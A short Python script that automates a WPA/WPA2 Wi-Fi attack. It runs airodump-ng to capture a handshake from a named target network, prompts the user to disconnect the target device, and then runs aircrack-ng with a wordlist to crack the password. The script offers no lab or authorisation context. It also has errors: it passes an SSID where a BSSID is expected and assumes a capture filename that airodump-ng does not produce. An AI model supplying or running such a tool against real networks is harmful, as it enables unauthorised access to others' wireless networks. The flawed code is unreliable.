import subprocess

def capture_handshake(interface, target_ssid):
    """Capture the WPA/WPA2 handshake for the specified SSID."""
    try:
        # Start airodump-ng to capture handshakes
        subprocess.run(['airodump-ng', interface, '--bssid', target_ssid, '--write', 'handshake'], check=True)
        print("Handshake capture started. Please disconnect the target device to capture the handshake.")
    except Exception as e:
        return f"Error capturing handshake: {e}"

def crack_wpa_handshake(wordlist):
    """Run aircrack-ng to crack the captured handshake using the specified wordlist."""
    try:
        subprocess.run(['aircrack-ng', 'handshake.cap', '-w', wordlist], check=True)
        print("Cracking attempt completed.")
    except Exception as e:
        return f"Error cracking handshake: {e}"

# Example usage
if __name__ == "__main__":
    interface = "wlan0"  # Network interface
    target_ssid = "TargetNetwork"  # Target SSID
    wordlist = "path/to/wordlist.txt"  # Path to the wordlist file

    capture_handshake(interface, target_ssid)
    crack_wpa_handshake(wordlist)
